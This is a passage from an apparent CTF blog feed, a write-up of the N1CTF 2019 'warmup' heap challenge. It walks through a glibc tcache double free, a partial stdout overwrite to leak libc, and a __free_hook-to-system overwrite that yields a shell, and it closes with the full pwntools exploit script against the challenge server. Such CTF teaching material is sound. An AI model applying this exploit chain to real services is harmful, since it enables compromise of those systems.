tcachebin , their behaviour will be very similar to when they were inserted in a fastbin chunk before tcache was introduced. The main problem is we can only allocate 0x40 chunks (0x51 -&gt; size + flags) for example if we allocate one item this is how it looks like in the heap:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/r4PaEa6.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/r4PaEa6.png" alt><br></a></p><p>In order to transform the chunk above into a chunk in range of a unsorted bin(unsorted bin because after a free it will update <strong>fd</strong> <strong>bk</strong> pointers into libc addresses) we kinda need an arbitrary write. </p><p>This can be achieved with double free and by changing the <strong>fd</strong> pointer into a place we want to write, when malloc executes it will return the modified <strong> fd</strong> pointer in our case we want it to be right at the chunk header (0x5595b74c0660) so we can modify the size from 0x51 to 0x91.</p><p>Imagine after chunk A we allocate more 2 chunks B and C, if we free B first, <strong>free</strong> will check if there is any chunk inside tcachebin of size 0x50:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/guHHuxk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/guHHuxk.png" alt><br></a></p><p>As you can see above there isn’t any list of size 0x50 so it will update the <strong>fd</strong> of the chunk to null.</p><p>Chunk B before free:<br><a data-fancybox="gallery" href="https://i.imgur.com/jFbSiXq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/jFbSiXq.png" alt><br></a></p><p>Chunk B after free:<br><a data-fancybox="gallery" href="https://i.imgur.com/iFBwQui.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/iFBwQui.png" alt><br></a></p><p>The pointer to the current freed chunk is inserted into tcachebin(0x50) at the head:<br><a data-fancybox="gallery" href="https://i.imgur.com/0mVFp0g.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0mVFp0g.png" alt><br></a></p><p>If we free chunk C now its <strong>fd</strong> is updated to chunk B pointer:<br><a data-fancybox="gallery" href="https://i.imgur.com/r6HICoF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/r6HICoF.png" alt><br></a></p><p>And the current freed chunk pointer is inserted at the head of tcachebin(0x50):<br><a data-fancybox="gallery" href="https://i.imgur.com/R0w8x74.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/R0w8x74.png" alt><br></a></p><p>Now if we free Chunk A its <strong>fd</strong> is going to point to chunk C:<br><a data-fancybox="gallery" href="https://i.imgur.com/WICM2Kk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/WICM2Kk.png" alt><br></a></p><p>Chunks A content pointer is added to the tcachebin(0x50) linked list:<br><a data-fancybox="gallery" href="https://i.imgur.com/aJMDK2Z.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/aJMDK2Z.png" alt><br></a></p><p>If we double free Chunk A its <strong>fd</strong> is going to point to its own because the previous freed as chunk A:<br><a data-fancybox="gallery" href="https://i.imgur.com/XVLjjNX.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XVLjjNX.png" alt><br></a></p><p>Chunks A content pointer is added to tcachebin(0x50):<br><a data-fancybox="gallery" href="https://i.imgur.com/BvNV320.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BvNV320.png" alt><br></a></p><p>Notice that ALSR doesn’t modify the last 3 numbers of the pointers of each chunk on the heap:<br><a data-fancybox="gallery" href="https://i.imgur.com/9a5RUBi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9a5RUBi.png" alt><br></a></p><p>The reason why there is a tcachebin is to reuse space on the heap when a new chunk is allocated, if it’s a perfect fit for example malloc will look at the list of that size and reposition the new allocated chunk on the same places where old chunks were freed. And this is why double freeing is so powerful, since one of the pointers is repeated in the list if we allocate one and modify the last byte of the <strong>fd</strong> to 0x60 we can make the next malloc to return to the <strong>fd</strong> we want getting an arbitrary write.</p><p>So this is how the exploit looks like right now:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = getConn()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        debug([<span class="number">0xBFB</span>,<span class="number">0xD25</span>]) <span class="comment"># add BFB free 0xD25</span></span><br><span class="line"></span><br><span class="line">    add(<span class="string">'A'</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)) <span class="comment"># TO PREVENT double free or corruption (!prev) 1</span></span><br><span class="line">    add(<span class="string">'C'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+p64(<span class="number">0x01</span>)) <span class="comment"># TO PREVENT corrupted size vs. prev_size 2</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>The tcache bin list right now is:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x50 [4]: 0x56018d3ae670 -&gt; 0x56018d3ae670</span><br></pre></td></tr></table></figure></p><p>If we do this mallocs:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x50 [4]: 0x56018d3ae670 -&gt; 0x56018d3ae670</span></span><br><span class="line">add(<span class="string">'\x70'</span>) <span class="comment"># malloc will return 0x56018d3ae670 and updates last byte of fd to 0x70 | Index 0</span></span><br><span class="line"><span class="comment"># 0x50 [3]: 0x56018d3ae670 -&gt; 0x56018d3ae670</span></span><br><span class="line">add(<span class="string">'\x60'</span>) <span class="comment"># malloc will return 0x56018d3ae670 and updates last byte of fd to 0x60 | Index 1</span></span><br><span class="line"><span class="comment"># 0x50 [2]: 0x56018d3ae670 -&gt; 0x56018d3ae660</span></span><br><span class="line">add(<span class="string">'\x60'</span>) <span class="comment"># malloc will return 0x56018d3ae670 and updates last byte of fd to 0x60 | Index 2</span></span><br><span class="line"><span class="comment"># 0x50 [1]: 0x56018d3ae660</span></span><br><span class="line">add(p64(<span class="number">0x0</span>)) <span class="comment"># malloc will return 0x56018d3ae660 | Index 3</span></span><br></pre></td></tr></table></figure><p>After this if we edit index 3:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># 0x50 [  1]: 0x56018d3ae670 &lt;- 0x0</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># 0x50 [  2]: 0x56018d3ae670 &lt;- 0x56018d3ae670</span></span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># modifies the header of chunk A from p64(0x0)+p64(0x51) to p64(0x0)+p64(0x91)</span></span><br></pre></td></tr></table></figure><p>The look of chunk A in GDB after edit:<br><a data-fancybox="gallery" href="https://i.imgur.com/6liWVaM.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/6liWVaM.png" alt><br></a></p><p>Now that we have a 0x91 chunk we need to fill tcachebin of 0x91, we can do this by freeing it 7 times:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>The look at tcachebins after this:<br><a data-fancybox="gallery" href="https://i.imgur.com/UGdrV7l.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UGdrV7l.png" alt><br></a></p><p>Next <strong>free(1)</strong> the chunk is going to be inserted into an unsortedbin:<br><a data-fancybox="gallery" href="https://i.imgur.com/aioqaqu.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/aioqaqu.png" alt><br></a></p><p>The reason for an unsortedbin is because both <strong>fd</strong> and <strong>bk</strong> will be updated into libc addresses:<br><a data-fancybox="gallery" href="https://i.imgur.com/OZcxQBy.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/OZcxQBy.png" alt><br></a></p><p>The reasons why I created chunk B and C was to be able to free this chunk, because tcache is full next free will have security checks, on my old write up of penpal world I did the same thing and I explained why chunk B and C bypass this checks you can find it at <a href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/">https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/</a></p><p>The first thing we want to do now is to convert this bin again back to 0x51 size we still have its pointer saved at index 3 so we can easily do it with:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>))</span><br></pre></td></tr></table></figure><p>We want to do this because tcachebin(0x91) is <strong>full</strong> , we want to manipulate tcachebins again, since we already double freed before at tcachebin(0x50). </p><p>The other reason is that we can <strong>only</strong> malloc chunks of size 0x51.</p><p>Lets compare the difference of stdout address and the address that got placed at the <strong>fd</strong> .</p><p>Stdout address:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x stdout</span><br><span class="line"><span class="variable">$3</span> = 0x7f8421047760</span><br></pre></td></tr></table></figure></p><p><strong>fd</strong> pointer at chunk A:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x56018d3ae660+0x10</span><br><span class="line">0x56018d3ae670: 0x00007f8421046ca0      0x00007f8421046ca0</span><br></pre></td></tr></table></figure><p>We want to modify <strong>0x7f8421046ca0</strong> to <strong>0x7f8421047760</strong> we only need to change the last 2 bytes, we know that the last 3 numbers of stdout never change(670), they are always the same, so the only thing we need to brute force is the 4th this means if we try to modify the last two bytes of the <strong>fd</strong> to p16(0x7760) we would have a probability of 1/16 because the only possibilities for <strong>last bytes</strong> of stdout are:</p><blockquote>0760<br>1760<br>2760<br>3760<br>4760<br>5760<br>6760<br>7760<br>8760<br>9760<br>a760<br>b760<br>c760<br>d760<br>e760<br>f760<br></blockquote><p>This is the look of tcachebins right now:<br><a data-fancybox="gallery" href="https://i.imgur.com/EfA29yV.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/EfA29yV.png" alt><br></a></p><p>So on our second malloc, the pointer returned will be the libc address but before that we need to modify the last 2 bytes from one of the 16 possibilities:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, p16(<span class="number">0x7760</span>))</span><br></pre></td></tr></table></figure><p>Now if we succeed to bruteforce stdout we need to overwrite <strong>stdout-&gt;_flags</strong> with 0xfbad1800 and <strong>_IO_read_ptr</strong>, <strong>_IO_read_end</strong>, <strong>_IO_read_base</strong> with NULL and the last byte of <strong>_IO_write_base</strong> with NULL, if we do this next puts will leak a bunch of libc addresses a more detailed explanation on why this works can be found at <a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">https://vigneshsrao.github.io/babytcache/</a> this guy explains it very well.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'A'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    add(p64(<span class="number">0x0fbad1800</span>)+ <span class="number">3</span>*p64(<span class="number">0</span>) + <span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure></p><p>if we succeed something like this is printed to the screen where we can see a lot of libc addresses leaked there:<br><a data-fancybox="gallery" href="https://i.imgur.com/Axh5NYh.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Axh5NYh.png" alt><br></a></p><p>Now adapting a bit more our code to make sure we got libc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r.recv(<span class="number">0x8</span>)</span><br><span class="line">leak = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = leak<span class="number">-0x3ed8b0</span></span><br><span class="line">SYSTEM = LIBC + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">FREE_HOOK = LIBC + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">MALLOC_HOOK = LIBC + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">if</span> LIBC &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span> <span class="keyword">or</span> LIBC &amp; <span class="number">0xFFF</span> != <span class="number">0</span>:</span><br><span class="line">    log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">log.success(<span class="string">"0x%x"</span>%leak)</span><br><span class="line">log.success(<span class="string">"LIBC: 0x%x"</span> % LIBC)</span><br><span class="line">log.success(<span class="string">"SYSTEM: 0x%x"</span> % SYSTEM)</span><br><span class="line">log.success(<span class="string">"FREE_HOOK: 0x%x"</span> % FREE_HOOK)</span><br></pre></td></tr></table></figure><p>In the end, we have everything we need modify the <strong>fd</strong> of the object you want to free with /bin/sh and overwrite free_hook with system so next time we trigger free we get a shell!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)) <span class="comment"># 0</span></span><br><span class="line">edit(<span class="number">0</span>,p64(FREE_HOOK))</span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)) <span class="comment"># 1</span></span><br><span class="line">add(p64(SYSTEM)) <span class="comment"># 4</span></span><br><span class="line">    </span><br><span class="line">edit(<span class="number">2</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"47.52.90.3"</span>, <span class="string">"9999"</span></span><br><span class="line">filename = <span class="string">"./warmup"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    <span class="comment">#script += "b * 0x%x\n"%(LIBC+)</span></span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'content&gt;&gt;'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'content&gt;&gt;'</span>, content)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = getConn()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        debug([<span class="number">0xBFB</span>,<span class="number">0xD25</span>]) <span class="comment"># add BFB free 0xD25</span></span><br><span class="line"></span><br><span class="line">    add(<span class="string">'A'</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)) <span class="comment"># TO PREVENT double free or corruption (!prev) 1</span></span><br><span class="line">    add(<span class="string">'C'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+p64(<span class="number">0x01</span>)) <span class="comment"># TO PREVENT corrupted size vs. prev_size 2</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">'\x70'</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="string">'\x60'</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="string">'\x60'</span>) <span class="comment"># 2</span></span><br><span class="line">    add(p64(<span class="number">0x0</span>)) <span class="comment"># 3</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">3</span>, p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#edit(1, p16(0x95dd))</span></span><br><span class="line">    edit(<span class="number">3</span>, p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>))</span><br><span class="line">    <span class="comment">#edit(2, '\x60\x07\xdd')#p16(0xb760))</span></span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        edit(<span class="number">2</span>, p16(<span class="number">0xb760</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        edit(<span class="number">2</span>, <span class="string">'\x60\x07\xdd'</span>) <span class="comment"># echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">    add(<span class="string">'A'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">        add(p64(<span class="number">0x0fbad1800</span>)+ <span class="number">3</span>*p64(<span class="number">0</span>) + <span class="string">'\x00'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    r.recv(<span class="number">0x8</span>)</span><br><span class="line">    leak = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    LIBC = leak<span class="number">-0x3ed8b0</span></span><br><span class="line">    SYSTEM = LIBC + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    FREE_HOOK = LIBC + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">    MALLOC_HOOK = LIBC + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">    <span class="keyword">if</span> LIBC &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span> <span class="keyword">or</span> LIBC &amp; <span class="number">0xFFF</span> != <span class="number">0</span>:</span><br><span class="line">        log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    log.success(<span class="string">"0x%x"</span>%leak)</span><br><span class="line">    log.success(<span class="string">"LIBC: 0x%x"</span> % LIBC)</span><br><span class="line">    log.success(<span class="string">"SYSTEM: 0x%x"</span> % SYSTEM)</span><br><span class="line">    log.success(<span class="string">"FREE_HOOK: 0x%x"</span> % FREE_HOOK)</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)) <span class="comment"># 0</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(FREE_HOOK))</span><br><span class="line">    add(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)) <span class="comment"># 1</span></span><br><span class="line">    add(p64(SYSTEM)) <span class="comment"># 4</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'-------------------------------------------------------------------------'</span></span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>Running it<br><a data-fancybox="gallery" href="https://i.imgur.com/PmHDi0B.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/PmHDi0B.png" alt><br></a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;warmup&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;192&lt;/p&gt;
&lt;p&gt;Solvers 43&lt;/p&gt;
&lt;p&gt;attachment：&lt;a href=&quot;h
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Tcache" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"/>
    
      <category term="tcache_dup" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/"/>
    
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="double_free" scheme="https://teamrocketist.github.io/tags/double-free/"/>
    
      <category term="n1ctf2019" scheme="https://teamrocketist.github.io/tags/n1ctf2019/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Chaos Communication Camp 2019 CTF - pdfcreator</title>
    <link href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/"/>
    <id>https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/</id>
    <published>2019-08-25T09:54:28.000Z</published>
    <updated>2019-09-16T01:08:33.636Z</updated>
    
